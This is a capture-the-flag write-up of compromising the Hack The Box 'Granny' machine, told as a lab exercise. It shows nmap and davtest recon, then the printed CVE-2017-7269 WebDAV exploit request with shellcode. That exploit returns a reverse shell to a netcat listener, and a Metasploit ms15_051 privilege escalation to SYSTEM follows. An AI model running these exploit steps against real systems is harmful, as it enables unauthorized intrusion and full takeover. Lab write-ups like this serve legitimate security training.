### Granny HTB

### Difficulty = Easy

### IP Address = 10.10.10.15

Nmap Scan:

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Granny]
└─$ nmap -sCV -A 10.10.10.15 -p80 -oN nmapscan                     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 15:57 WAT
Nmap scan report for 10.10.10.15
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Wed, 25 Jan 2023 14:57:19 GMT
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Ah sweet it's just like [Grandpa](https://markuched13.github.io/posts/htb/grandpa.html)

I'll perform the same test I used then

Firstly `davtest`

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Granny]
└─$ davtest -url 10.10.10.15       
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                10.10.10.15
********************************************************
NOTE    Random string for this session: Nakr5rUpgP
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     jhtml   FAIL
PUT     cgi     FAIL
PUT     php     FAIL
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     jsp     FAIL
PUT     asp     FAIL
PUT     txt     FAIL
PUT     pl      FAIL
PUT     cfm     FAIL
PUT     html    FAIL

********************************************************
/usr/bin/davtest Summary:

```

But it failed to upload any file with those format 

Lets try the same exploit we used then on `Granpa` with this box also [Exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

```
                                                                                                                                                                                                                 
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Granny]
└─$ python2 exploit.py                               
usage:iis6webdav.py targetip targetport reverseip reverseport

```

I'll fill the correct arguments it requires

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Granny]
└─$ python2 exploit.py 10.10.10.15 80 10.10.16.7 1337
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa____________________________________________________________________________________________________________________________________________________________________________________
___________________________________________________________________________________________________> (Not <locktoken:write1>) <http://localhost/bbbbbbb__________________________________________________________
________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

```

Back on the listner we get a call back

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Granny]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

So i'll do the same thing i did for `Grandpa` i'll get a msf shell and run exploit suggester

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

From the result we se lot of exploit but am going to try each of them until one works

But for checking reason i'll try the same exploit i used for privesc on `Grandpa`

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 4072 launched.
[*] Reflectively injecting the DLL into 4072...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 4 opened (10.10.16.7:4444 -> 10.10.10.15:1044) at 2023-01-25 16:26:09 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

And it worked very weird probably its unintended 

Anyways and we're done

<br> <br>
[Back To Home](../../index.md)
<br>
